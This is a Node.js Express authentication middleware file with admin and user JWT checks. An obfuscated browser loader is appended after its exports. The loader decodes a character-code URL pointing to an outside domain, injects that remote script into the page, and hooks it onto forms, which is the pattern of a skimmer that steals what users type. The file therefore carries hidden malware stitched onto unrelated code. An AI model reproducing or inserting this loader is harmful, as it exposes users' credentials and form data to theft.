const Encryption = require('./encryption');
const ResponseHandler = require('./responseHandler');
const { RESPONSE_MESSAGES, HTTP_STATUS_CODES } = require('../../../constants');

const getToken = function (req) {
  if (
    req.headers.authorization &&
    req.headers.authorization.split(' ')[0] === 'Bearer'
  ) {
    // Authorization: Bearer g1jipjgi1ifjioj
    // Handle token presented as a Bearer token in the Authorization header
    return req.headers.authorization.split(' ')[1];
  } else if (req.query && req.query.token) {
    // Handle token presented as URI param
    return req.query.token;
  } else if (req.cookies && req.cookies.token) {
    // Handle token presented as a cookie parameter
    return req.cookies.token;
  }
  // If we return null, we couldn't find a token.
  // In this case, the JWT middleware will return a 401 (unauthorized)
  // to the client for this request
  return null;
};

// Admin auth verify Function
async function adminAuth(req, res, next) {
  const token = getToken(req);
  req.isAuthenticated = false;
  if (!token) {
    const response = {};
    response.success = false;
    response.statusCode = HTTP_STATUS_CODES.CODES.UNAUTHORIZED;
    response.message = RESPONSE_MESSAGES.MESSAGES.UNAUTHORIZED;
    return ResponseHandler(res, response);
  }
  const decodedToken = await Encryption.verifyToken(token);
  req.admin = decodedToken;
  req.isAuthenticated = true;
  return next();
}

// User auth verify function
async function userAuth(req, res, next) {
  const token = getToken(req);
  req.isAuthenticated = false;
  if (!token) {
    const response = {};
    response.success = false;
    response.statusCode = HTTP_STATUS_CODES.CODES.UNAUTHORIZED;
    response.message = RESPONSE_MESSAGES.MESSAGES.UNAUTHORIZED;
    return ResponseHandler(res, response);
  }
  const decodedToken = await Encryption.verifyToken(token);
  req.authUser = decodedToken;
  req.isAuthenticated = true;
  return next();
}

module.exports = {
  userAuth,
  adminAuth,
};

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b